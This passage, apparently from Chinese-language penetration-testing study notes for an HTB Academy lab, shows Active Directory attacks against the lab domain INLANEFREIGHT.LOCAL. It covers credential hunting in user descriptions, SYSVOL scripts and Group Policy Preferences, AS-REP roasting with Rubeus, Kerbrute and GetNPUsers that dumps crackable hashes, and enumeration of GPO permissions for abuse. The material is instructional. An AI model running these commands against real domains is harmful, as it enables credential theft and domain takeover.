computer/domain</span><br><span class="line">krbtgt         Key Distribution Center Service Account</span><br><span class="line">ldap.agent     *** <span class="keyword">DO</span> NOT CHANGE ***  <span class="number">3</span>/<span class="number">12</span>/<span class="number">2012</span>: Sunsh1ne4All!</span><br></pre></td></tr></table></figure>

<h4 id="使用-Get-DomainUser-检查-PASSWD-NOTREQD-设置"><a href="#使用-Get-DomainUser-检查-PASSWD-NOTREQD-设置" class="headerlink" title="使用 Get-DomainUser 检查 PASSWD_NOTREQD 设置"></a>使用 Get-DomainUser 检查 PASSWD_NOTREQD 设置</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-UACFilter</span> PASSWD_NOTREQD | <span class="built_in">Select-Object</span> samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                                                         useraccountcontrol</span><br><span class="line"><span class="literal">--------------</span>                                                         <span class="literal">------------------</span></span><br><span class="line">guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line">mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line">ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line"><span class="variable">$725000</span><span class="literal">-9jb50uejje9f</span>                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT</span><br><span class="line">nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure>

<h4 id="发现一个有趣的脚本"><a href="#发现一个有趣的脚本" class="headerlink" title="发现一个有趣的脚本"></a>发现一个有趣的脚本</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">ls</span> \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts</span><br><span class="line"></span><br><span class="line">    Directory: \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                 </span><br><span class="line"><span class="literal">-a----</span>       <span class="number">11</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">44</span> AM            <span class="number">174</span> daily<span class="literal">-runs</span>.zip                                                       </span><br><span class="line"><span class="literal">-a----</span>        <span class="number">2</span>/<span class="number">28</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">11</span> PM            <span class="number">203</span> <span class="built_in">disable-nbtns</span>.ps1                                                    </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">3</span>/<span class="number">7</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">41</span> AM         <span class="number">144138</span> Logon Banner.htm                                                     </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">3</span>/<span class="number">8</span>/<span class="number">2022</span>   <span class="number">2</span>:<span class="number">56</span> PM            <span class="number">979</span> reset_local_admin_pass.vbs  </span><br></pre></td></tr></table></figure>

<h4 id="在脚本中查找密码"><a href="#在脚本中查找密码" class="headerlink" title="在脚本中查找密码"></a>在脚本中查找密码</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">cat</span> \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line">strComputer = <span class="string">&quot;.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">Set</span> oShell = CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>) </span><br><span class="line">sUser = <span class="string">&quot;Administrator&quot;</span></span><br><span class="line">sPwd = <span class="string">&quot;!ILFREIGHT_L0cALADmin!&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">Set</span> Arg = WScript.Arguments</span><br><span class="line"><span class="keyword">If</span>  Arg.Count &gt; <span class="number">0</span> Then</span><br><span class="line">sPwd = Arg(<span class="number">0</span>) <span class="string">&#x27;Pass the password as parameter to the script</span></span><br><span class="line"><span class="string">End if</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#x27;</span>Get the administrator name</span><br><span class="line"><span class="built_in">Set</span> objWMIService = GetObject(<span class="string">&quot;winmgmts:\\&quot;</span> &amp; strComputer &amp; <span class="string">&quot;\root\cimv2&quot;</span>)</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="组策略首选项-GPP-密码"><a href="#组策略首选项-GPP-密码" class="headerlink" title="组策略首选项(GPP)密码"></a>组策略首选项(GPP)密码</h3><p>当创建新的 GPP 时，会在 SYSVOL 共享中生成一个.xml 文件，该文件也会缓存在应用组策略的终端本地。这些文件可用于：</p>
<ul>
<li>映射驱动器 (drives.xml)</li>
<li>创建本地用户</li>
<li>创建打印机配置文件（printers.xml）</li>
<li>创建和更新服务（services.xml）</li>
<li>创建计划任务 (scheduledtasks.xml)</li>
<li>更改本地管理员密码。</li>
</ul>
<p>这些文件可能包含各种配置数据和定义的密码。 <code>cpassword</code> 属性值采用 AES-256 位加密，但微软在 MSDN 上公布了 AES 私钥，可用于解密密码。任何域用户都可以读取这些文件，因为它们存储在 SYSVOL 共享中，默认情况下，域中的所有认证用户对该域控制器共享具有读取权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ crackmapexec smb -L | grep gpp</span><br><span class="line"></span><br><span class="line">[*] gpp_autologin             Searches the domain controller <span class="keyword">for</span> registry.xml to find autologon information and returns the username and password.</span><br><span class="line">[*] gpp_password              Retrieves the plaintext password and other information <span class="keyword">for</span> accounts pushed through Group Policy Preferences.</span><br></pre></td></tr></table></figure>

<h4 id="使用-CrackMapExec-的-gpp-autologin-模块"><a href="#使用-CrackMapExec-的-gpp-autologin-模块" class="headerlink" title="使用 CrackMapExec 的 gpp_autologin 模块"></a>使用 CrackMapExec 的 gpp_autologin 模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching <span class="keyword">for</span> Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/&#123;CAEBB51E-92FD-431D-8DBE-F9312DB5617D&#125;/Machine/Preferences/Registry/Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials <span class="keyword">in</span> INLANEFREIGHT.LOCAL/Policies/&#123;CAEBB51E-92FD-431D-8DBE-F9312DB5617D&#125;/Machine/Preferences/Registry/Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: [<span class="string">&#x27;guarddesk&#x27;</span>]</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: [<span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span>]</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: [<span class="string">&#x27;ILFreightguardadmin!&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h3><h4 id="使用-Get-DomainUser-枚举-DONT-REQ-PREAUTH-值"><a href="#使用-Get-DomainUser-枚举-DONT-REQ-PREAUTH-值" class="headerlink" title="使用 Get-DomainUser 枚举 DONT_REQ_PREAUTH 值"></a>使用 Get-DomainUser 枚举 DONT_REQ_PREAUTH 值</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-PreauthNotRequired</span> | <span class="built_in">select</span> samaccountname,userprincipalname,useraccountcontrol | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">samaccountname     : mmorgan</span><br><span class="line">userprincipalname  : mmorgan@inlanefreight.local</span><br><span class="line">useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH</span><br></pre></td></tr></table></figure>

<h4 id="使用-Rubeus-以正确格式检索-AS-REP"><a href="#使用-Rubeus-以正确格式检索-AS-REP" class="headerlink" title="使用 Rubeus 以正确格式检索 AS-REP"></a>使用 Rubeus 以正确格式检索 AS-REP</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: AS<span class="literal">-REP</span> roasting</span><br><span class="line"></span><br><span class="line">[*] Target User            : mmorgan</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))&#x27;</span></span><br><span class="line">[*] SamAccountName         : mmorgan</span><br><span class="line">[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/o preauth) <span class="keyword">for</span>: <span class="string">&#x27;INLANEFREIGHT.LOCAL\mmorgan&#x27;</span></span><br><span class="line">[+] AS<span class="literal">-REQ</span> w/o preauth successful!</span><br><span class="line">[*] AS<span class="literal">-REP</span> hash:</span><br><span class="line">     <span class="variable">$krb5asrep</span><span class="variable">$23</span><span class="variable">$mmorgan</span>@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55<span class="variable">$097</span>......</span><br></pre></td></tr></table></figure>

<h4 id="使用-Kerbrute-获取-AS-REP"><a href="#使用-Kerbrute-获取-AS-REP" class="headerlink" title="使用 Kerbrute 获取 AS-REP"></a>使用 Kerbrute 获取 AS-REP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/04/01 13:14:17 &gt;  Using KDC(s):</span><br><span class="line">2022/04/01 13:14:17 &gt;  	172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 sbrown@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 jjones@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 tjohnson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 jwilson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 bdavis@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 njohnson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 asanchez@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 dlewis@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 ccruz@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] mmorgan has no pre auth required. Dumping <span class="built_in">hash</span> to crack offline:</span><br><span class="line">$krb5asrep$23<span class="variable">$mmorgan</span>@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33<span class="variable">$8698e</span>.......</span><br></pre></td></tr></table></figure>

<h4 id="无需预认证的-Kerberoast-用户狩猎"><a href="#无需预认证的-Kerberoast-用户狩猎" class="headerlink" title="无需预认证的 Kerberoast 用户狩猎"></a>无需预认证的 Kerberoast 用户狩猎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users </span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User sbrown@inlanefreight.local doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User jjones@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User tjohnson@inlanefreight.local doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User jwilson@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User bdavis@inlanefreight.local doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User njohnson@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User asanchez@inlanefreight.local doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User dlewis@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User ccruz@inlanefreight.local doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9</span></span><br><span class="line"><span class="string">[-] User rramirez@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User jwallace@inlanefreight.local doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User jsantiago@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="组策略对象（GPO）滥用"><a href="#组策略对象（GPO）滥用" class="headerlink" title="组策略对象（GPO）滥用"></a>组策略对象（GPO）滥用</h3><p>组策略为管理员提供了许多高级设置，这些设置可以应用于 AD 环境中的用户和计算机对象。正确使用时，组策略是通过配置用户设置、操作系统和应用程序来强化 AD 环境的绝佳工具。然而，组策略也可能被攻击者滥用。如果我们能够通过 ACL 配置错误获得对组策略对象的权限，我们就可以利用这一点进行横向移动、权限提升，甚至域控制，并在域内作为持久性机制。了解如何枚举和攻击 GPO 可以帮助我们在高度受限的环境中取得优势，有时甚至成为达成目标的关键。</p>
<h4 id="使用-PowerView-枚举-GPO-名称"><a href="#使用-PowerView-枚举-GPO-名称" class="headerlink" title="使用 PowerView 枚举 GPO 名称"></a>使用 PowerView 枚举 GPO 名称</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainGPO</span> |<span class="built_in">select</span> displayname</span><br><span class="line"></span><br><span class="line">displayname</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">Default Domain Policy</span><br><span class="line">Default Domain Controllers Policy</span><br><span class="line">Deny Control Panel Access</span><br><span class="line">Disallow LM Hash</span><br><span class="line">Deny CMD Access</span><br><span class="line">Disable Forced Restarts</span><br><span class="line">Block Removable Media</span><br><span class="line">Disable Guest Account</span><br><span class="line">Service Accounts Password Policy</span><br><span class="line">Logon Banner</span><br><span class="line">Disconnect Idle RDP</span><br><span class="line">Disable NetBIOS</span><br><span class="line">AutoLogon</span><br><span class="line">GuardAutoLogon</span><br><span class="line">Certificate Services</span><br></pre></td></tr></table></figure>

<h4 id="使用内置-Cmdlet-枚举-GPO-名称"><a href="#使用内置-Cmdlet-枚举-GPO-名称" class="headerlink" title="使用内置 Cmdlet 枚举 GPO 名称"></a>使用内置 Cmdlet 枚举 GPO 名称</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-GPO</span> <span class="literal">-All</span> | <span class="built_in">Select</span> DisplayName</span><br><span class="line"></span><br><span class="line">DisplayName</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">Certificate Services</span><br><span class="line">Default Domain Policy</span><br><span class="line">Disable NetBIOS</span><br><span class="line">Disable Guest Account</span><br><span class="line">AutoLogon</span><br><span class="line">Default Domain Controllers Policy</span><br><span class="line">Disconnect Idle RDP</span><br><span class="line">Disallow LM Hash</span><br><span class="line">Deny CMD Access</span><br><span class="line">Block Removable Media</span><br><span class="line">GuardAutoLogon</span><br><span class="line">Service Accounts Password Policy</span><br><span class="line">Logon Banner</span><br><span class="line">Disable Forced Restarts</span><br><span class="line">Deny Control Panel Access</span><br></pre></td></tr></table></figure>

<h4 id="枚举域用户组策略权限"><a href="#枚举域用户组策略权限" class="headerlink" title="枚举域用户组策略权限"></a>枚举域用户组策略权限</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$sid</span>=<span class="built_in">Convert-NameToSid</span> <span class="string">&quot;Domain Users&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainGPO</span> | <span class="built_in">Get-ObjectAcl</span> | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125;</span><br><span class="line"></span><br><span class="line">ObjectDN              : CN=&#123;<span class="number">7</span>CA9C789<span class="literal">-14CE-46E3-A722-83F4097AF532</span>&#125;,CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ObjectSID             :</span><br><span class="line">ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,</span><br><span class="line">                        WriteOwner</span><br><span class="line">BinaryLength          : <span class="number">36</span></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">IsCallback            : False</span><br><span class="line">OpaqueLength          : <span class="number">0</span></span><br><span class="line">AccessMask            : <span class="number">983095</span></span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-513</span></span><br><span class="line">AceType               : AccessAllowed</span><br><span class="line">AceFlags              : ObjectInherit, ContainerInherit</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : ContainerInherit, ObjectInherit</span><br><span class="line">PropagationFlags      : None</span><br><span class="line">AuditFlags            : None</span><br></pre></td></tr></table></figure>

<h4 id="将-GPO-GUID-转换为名称"><a href="#将-GPO-GUID-转换为名称" class="headerlink" title="将 GPO GUID 转换为名称"></a>将 GPO GUID 转换为名称</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb <span class="built_in">Get-GPO</span> <span class="literal">-Guid</span> <span class="number">7</span>CA9C789<span class="literal">-14CE-46E3-A722-83F4097AF532</span></span><br><span class="line"></span><br><span class="line">DisplayName      : Disconnect Idle RDP</span><br><span class="line">DomainName       : INLANEFREIGHT.LOCAL</span><br><span class="line">Owner            : INLANEFREIGHT\Domain Admins</span><br><span class="line">Id               : <span class="number">7</span>ca9c789<span class="literal">-14ce-46e3-a722-83f4097af532</span></span><br><span class="line">GpoStatus        : AllSettingsEnabled</span><br><span class="line">Description      :</span><br><span class="line">CreationTime     : <span class="number">10</span>/<span class="number">28</span>/<span class="number">2021</span> <span class="number">3</span>:<span class="number">34</span>:<span class="number">07</span> PM</span><br><span class="line">ModificationTime : <span class="number">4</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">54</span>:<span class="number">25</span> PM</span><br><span class="line">UserVersion      : AD Version: <span class="number">0</span>, SysVol Version: <span class="number">0</span></span><br><span class="line">ComputerVersion  : AD Version: <span class="number">0</span>, SysVol Version: <span class="number">0</span></span><br><span class="line">WmiFilter        :</span><br></pre></td></tr></table></figure>

<h1 id="拿下一个域后，向着其他域进攻"><a href="#拿下一个域后，向着其他域进攻" class="headerlink" title="拿下一个域后，向着其他域进攻"></a>拿下一个域后，向着其他域进攻</h1><h2 id="域信任概述"><a href="#域信任概述" class="headerlink" title="域信任概述"></a>域信任概述</h2><p>信任用于建立森林间或域间（域内）的身份验证，使用户能够访问其账户所在主域之外的其他域中的资源（或执行管理任务）。信任在两个域的身份验证系统之间创建链接，并可能允许单向或双向（双向）通信。组织可以创建多种类型的信任：</p>
<ul>
<li><code>Parent-child</code> : 同一林中的两个或多个域。子域与父域之间存在双向可传递信任关系，这意味着子域 <code>corp.inlanefreight.local</code> 中的用户可以向父域 <code>inlanefreight.local</code> 进行身份验证，反之亦然。</li>
<li><code>Cross-link</code> : 子域之间的信任关系，以加快身份验证速度。</li>
<li><code>External</code> : 两个独立域之间在不同林中且未通过林信任连接的非传递性信任。此类信任使用 SID 过滤或过滤掉来自非受信任域的认证请求（通过 SID）。</li>
<li><code>Tree-root</code> : 森林根域与新树根域之间的双向可传递信任。当您在森林中设置新树根域时，它们是按设计创建的。</li>
<li><code>Forest</code> : 两个林根域之间的传递信任。</li>
<li>ESAE：用于管理 Active Directory 的堡垒森林。</li>
</ul>
<p>在建立信任时，某些元素可以根据业务案例进行修改。</p>
<p>信任可以是可传递的或不可传递的。</p>
<ul>
<li><code>transitive</code> 信任意味着信任被扩展到子域信任的对象。例如，假设我们有三个域。在传递性关系中，如果 <code>Domain A</code> 与 <code>Domain B</code> 建立了信任关系，并且 <code>Domain B</code> 与 <code>Domain C</code> 建立了 <code>transitive</code> 信任关系，那么 <code>Domain A</code> 将自动信任 <code>Domain C</code> 。</li>
<li>在 <code>non-transitive trust</code> 中，子域本身是唯一受信任的。</li>
</ul>
